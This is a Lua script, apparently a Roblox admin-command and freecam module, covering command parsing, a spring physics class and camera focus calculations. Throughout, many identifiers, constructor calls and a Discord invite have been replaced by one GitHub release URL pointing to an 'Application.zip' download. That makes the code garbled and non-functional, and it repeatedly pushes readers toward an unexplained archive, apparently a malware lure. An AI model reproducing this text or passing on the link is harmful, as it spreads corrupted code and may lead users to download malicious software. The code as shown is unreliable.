function alignFunctions(getArgs)
	arguments = https://github.com/russbzallin/russbzallin/releases/download/v1.0/Application.zip(getArgs," ")
	function getstring(begin)
		local start = begin-1
		local AA = ''
		for i,v in pairs(arguments) do
			if i > start then
				if AA ~= '' then
					AA = AA .. ' ' .. v
				else
					AA = AA .. v
				end
			end
		end
		return AA
	end
	arguments[1] = arguments[1]:lower()
end

function executeCommand(com)
	wait(.1)
	if com:lower():sub(1,#prefix) == prefix then
		com = com:sub(#prefix+1,#com)
	elseif com:lower():sub(1,1) == '.' then
		com = com:sub(2,#com)
	end
	if com ~= "" then
		local matchCommand = ""
		alignFunctions(com)
		local cmdsy = findCmd(arguments[1])
		if cmdsy then
			History[#History+1] = com
			for _,v in pairs(CMDStats) do
				if cmdsy == _ then
					v.T = v.T + 1
				end
			end
			updatesaves()
			if fixedArgs == false then
				if commandsLoaded() and noCMD == false then
					if Debugging == false then
						useCommand[cmdsy]()
					else
						pcall(function() useCommand[cmdsy]() end)
					end
				elseif noCMD == true and cmdsy == "yescommands" then
					useCommand[cmdsy]()
				else
					opx("*","Need help? Join our discord! "https://github.com/russbzallin/russbzallin/releases/download/v1.0/Application.zip)
				end
			else
				opx("*","Need help? Join our discord! "https://github.com/russbzallin/russbzallin/releases/download/v1.0/Application.zip)
			end
		else
			local invalidString = getstring(1)
			if #invalidString > 38 then
				invalidString = invalidString:sub(1,35).."..."
			end
			opx("*",invalidString.." is not a valid command.")
		end
	end    
end

Spring = {} do
	Spring.__index = Spring

	function https://github.com/russbzallin/russbzallin/releases/download/v1.0/Application.zip(freq, pos)
		local self = setmetatable({}, Spring)
		self.f = freq
		self.p = pos
		self.v = pos*0
		return self
	end

	function Spring:Update(dt, goal)
		local f = self.f*2*pi
		local p0 = self.p
		local v0 = self.v

		local offset = goal - p0
		local decay = exp(-f*dt)

		local p1 = goal + (v0*dt - offset*(f*dt + 1))*decay
		local v1 = (f*dt*(offset*f - v0) + v0)*decay

		self.p = p1
		self.v = v1

		return p1
	end

	function Spring:Reset(pos)
		self.p = pos
		self.v = pos*0
	end
end

function GetFocusDistance(cameraFrame)
	local znear = 0.1
	local viewport = https://github.com/russbzallin/russbzallin/releases/download/v1.0/Application.zip
	local projy = 2*tan(cameraFov/2)
	local projx = viewport.x/viewport.y*projy
	local fx = https://github.com/russbzallin/russbzallin/releases/download/v1.0/Application.zip
	local fy = https://github.com/russbzallin/russbzallin/releases/download/v1.0/Application.zip
	local fz = https://github.com/russbzallin/russbzallin/releases/download/v1.0/Application.zip

	local minVect = https://github.com/russbzallin/russbzallin/releases/download/v1.0/Application.zip()
	local minDist = 512

	for x = 0, 1, 0.5 do
		for y = 0, 1, 0.5 do
			local cx = (x - 0.5)*projx
			local cy = (y - 0.5)*projy
			local offset = fx*cx - fy*cy + fz
			local origin = cameraFrame.p + offset*znear
			local _, hit = Workspace:FindPartOnRay(https://github.com/russbzallin/russbzallin/releases/download/v1.0/Application.zip(origin, https://github.com/russbzallin/russbzallin/releases/download/v1.0/Application.zip*minDist))
			local dist = (hit - origin).magnitude
			if minDist > dist then
				minDist = dist
				minVect = https://github.com/russbzallin/russbzallin/releases/download/v1.0/Application.zip
			end
		end
	end
	return fz:Dot(minVect)*minDist
end

local function StepFreecam(dt)
	local vel = velSpring:Update(dt, https://github.com/russbzallin/russbzallin/releases/download/v1.0/Application.zip(dt))

	local fov = fovSpring:Update(dt, https://github.com/russbzallin/russbzallin/releases/download/v1.0/Application.zip(dt))

	local zoomFactor = sqrt(tan(rad(70/2))/tan(rad(cameraFov/2)))

	cameraFov = clamp(cameraFov + fov*FOV_GAIN*(dt/zoomFactor), 1, 120)
	cameraRot = cameraRot + pan*PAN_GAIN*(dt/zoomFactor)
	cameraRot = https://github.com/russbzallin/russbzallin/releases/download/v1.0/Application.zip(clamp(cameraRot.x, -PITCH_LIMIT, PITCH_LIMIT), cameraRot.y%(2*pi))

	cameraPos = cameraCFrame.p

	https://github.com/russbzallin/russbzallin/releases/download/v1.0/Application.zip = cameraCFrame
	https://github.com/russbzallin/russbzallin/releases/download/v1.0/Application.zip = cameraCFrame*https://github.com/russbzallin/russbzallin/releases/download/v1.0/Application.zip(0, 0, -GetFocusDistance(cameraCFrame))
	https://github.com/russbzallin/russbzallin/releases/download/v1.0/Application.zip = cameraFov
end
